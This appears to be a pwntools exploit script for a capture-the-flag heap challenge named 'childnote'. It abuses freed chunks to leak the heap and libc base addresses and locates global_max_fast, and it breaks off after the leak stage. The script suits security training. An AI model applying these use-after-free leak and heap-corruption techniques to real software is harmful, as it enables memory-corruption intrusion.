from pwn import *

p = process('./childnote')
#p = remote('140.112.31.97', 30204)

def create(size, content):
    p.sendafter('>', '1')
    p.sendafter('size : ', str(size))
    p.sendafter('Content : ', content)

def show(index):
    p.sendafter('>', '2')
    p.sendafter('index : ', str(index))

def edit(index, content):
    p.sendafter('>', '3')
    p.sendafter('index : ', str(index))
    p.sendafter('Content : ', content)

def delete(index):
    p.sendafter('>', '4')
    p.sendafter('index : ', str(index))

for i in range(8):
    create(0x80, 'a')
for i in range(1, 8):
    delete(i)
delete(0)

show(1)
heap = u64(p.recvline().strip().ljust(8, b'\x00'))-0x10
success('heap base = 0x%x', heap)
show(0)
libc_base = u64(p.recvline().strip().ljust(8, b'\x00'))-0x1ebbe0
success('libc base = 0x%x', libc_base)
global_max_fast = libc_base+0x1eeb80
success('global_max_fast = 0x%x', global_max_fast)

create(0x88, 'a')   # 8


p.interactive()
